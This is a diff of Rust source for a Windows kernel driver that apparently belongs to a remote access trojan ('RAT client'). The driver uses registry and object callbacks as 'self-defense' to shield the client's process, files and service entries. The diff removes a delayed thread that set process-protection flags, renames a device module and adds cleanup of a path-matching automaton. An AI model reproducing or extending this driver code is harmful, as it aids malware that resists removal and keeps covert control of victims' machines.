@@ -5,7 +5,6 @@ use core::{mem, ptr, slice};
 
 use aho_corasick::AhoCorasickBuilder;
 use rat_common::utils::DropGuard;
-use rat_common::windows::PROCESS_PROTECTED_ACCESS;
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
@@ -25,11 +24,11 @@ use crate::global::{
     CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
     OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_ENTRY_COMPLETED, ORIGINAL_DRIVER_OBJECT,
     ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
-    RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
-    RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
+    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE,
+    SERVICE_REGISTRY_AHO_CORASICK,
 };
 use crate::handlers::registry::cm_register_callback;
-use crate::handlers::{irp, object};
+use crate::handlers::{device, object};
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
 use crate::{error, info, warn};
@@ -140,19 +139,6 @@ fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
     }
 }
 
-unsafe extern "C" fn set_protected_flags_thread_routine(_: *mut c_void) {
-    let mut sleep = LARGE_INTEGER {
-        QuadPart: -300000000,
-    }; // 30 seconds
-    let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
-    if nt_success(status) {
-        RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG.store(PROCESS_PROTECTED_ACCESS, Ordering::Release);
-        info!("Set process self-defense flags to 0x{PROCESS_PROTECTED_ACCESS:X}");
-    } else {
-        error!("KeDelayExecutionThread error: 0x{status:X}");
-    }
-}
-
 fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
     let mut success = true;
     match drop_file() {
@@ -197,21 +183,6 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
                 unsafe {
                     ObUnRegisterCallbacks(handle);
                 }
-            }
-
-            let status = unsafe {
-                PsCreateSystemThread(
-                    ptr::null_mut(),
-                    THREAD_ALL_ACCESS,
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    Some(set_protected_flags_thread_routine),
-                    ptr::null_mut(),
-                )
-            };
-            if !nt_success(status) {
-                error!("Cannot create thread to set process protection flags: 0x{status:X}");
             }
         }
         Err(e) => {
@@ -259,7 +230,7 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         }
     }
 
-    match irp::create_device(driver) {
+    match device::create_device(driver) {
         Ok(_) => info!("Created device"),
         Err(e) => {
             success = false;
@@ -312,6 +283,14 @@ fn remove_registered_services(driver: PDRIVER_OBJECT) {
         info!("Unregistering object callbacks");
         unsafe {
             ObUnRegisterCallbacks(handle);
+        }
+    }
+
+    let ac = OBJ_PATH_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
+    if !ac.is_null() {
+        info!("Dropping Aho-Corasick automaton");
+        unsafe {
+            let _ = Box::from_raw(ac);
         }
     }
 }
